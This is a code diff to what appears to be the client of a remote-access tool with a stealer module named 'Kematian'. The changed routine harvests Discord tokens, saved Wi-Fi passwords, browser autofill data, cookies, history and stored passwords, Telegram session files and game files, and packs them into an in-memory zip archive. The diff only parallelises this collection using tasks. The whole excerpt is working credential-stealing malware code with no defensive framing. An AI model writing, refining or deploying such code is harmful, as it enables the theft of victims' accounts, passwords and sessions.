@@ -25,67 +25,80 @@ namespace Pulsar.Client.Kematian
 
                     var textMethods = new KeyValuePair<Func<string>, string>[]
                     {
-                        new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
-                        new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
-                        new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
-                        new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram\\sessions.txt")
+                            new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
+                            new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
+                            new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
+                            new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
+                            new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
+                            new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
+                            new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
+                            new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram\\sessions.txt")
                     };
+
+                    var tasks = new List<Task>();
 
                     foreach (var methodPair in textMethods)
                     {
+                        tasks.Add(Task.Run(() =>
+                        {
+                            try
+                            {
+                                var content = methodPair.Key();
+                                var zipEntry = archive.CreateEntry(methodPair.Value);
+                                using (var entryStream = new BufferedStream(zipEntry.Open()))
+                                using (var streamWriter = new StreamWriter(entryStream))
+                                {
+                                    streamWriter.Write(content);
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
+                            }
+                        }));
+                    }
+
+                    tasks.Add(Task.Run(() =>
+                    {
                         try
                         {
-                            var content = methodPair.Key();
-                            var zipEntry = archive.CreateEntry(methodPair.Value);
-                            using (var entryStream = new BufferedStream(zipEntry.Open()))
-                            using (var streamWriter = new StreamWriter(entryStream))
+                            var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
+                            foreach (var file in telegramFiles)
                             {
-                                streamWriter.Write(content);
+                                var zipEntry = archive.CreateEntry(file.Key);
+                                using (var entryStream = new BufferedStream(zipEntry.Open()))
+                                {
+                                    entryStream.Write(file.Value, 0, file.Value.Length);
+                                }
                             }
                         }
                         catch (Exception ex)
                         {
-                            Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
+                            Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
                         }
-                    }
+                    }));
 
-                    try
+                    tasks.Add(Task.Run(() =>
                     {
-                        var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
-                        foreach (var file in telegramFiles)
+                        try
                         {
-                            var zipEntry = archive.CreateEntry(file.Key);
-                            using (var entryStream = new BufferedStream(zipEntry.Open()))
+                            var gameFiles = GamesRetriever.GetGameFiles();
+                            foreach (var file in gameFiles)
                             {
-                                entryStream.Write(file.Value, 0, file.Value.Length);
+                                var zipEntry = archive.CreateEntry(file.Key);
+                                using (var entryStream = new BufferedStream(zipEntry.Open()))
+                                {
+                                    entryStream.Write(file.Value, 0, file.Value.Length);
+                                }
                             }
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
-                    }
-
-                    try
-                    {
-                        var gameFiles = GamesRetriever.GetGameFiles();
-                        foreach (var file in gameFiles)
+                        catch (Exception ex)
                         {
-                            var zipEntry = archive.CreateEntry(file.Key);
-                            using (var entryStream = new BufferedStream(zipEntry.Open()))
-                            {
-                                entryStream.Write(file.Value, 0, file.Value.Length);
-                            }
+                            Debug.WriteLine($"Error processing game files: {ex.Message}");
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error processing game files: {ex.Message}");
-                    }
+                    }));
+
+                    Task.WhenAll(tasks).Wait();
                 }
                 data = memoryStream.ToArray();
             }
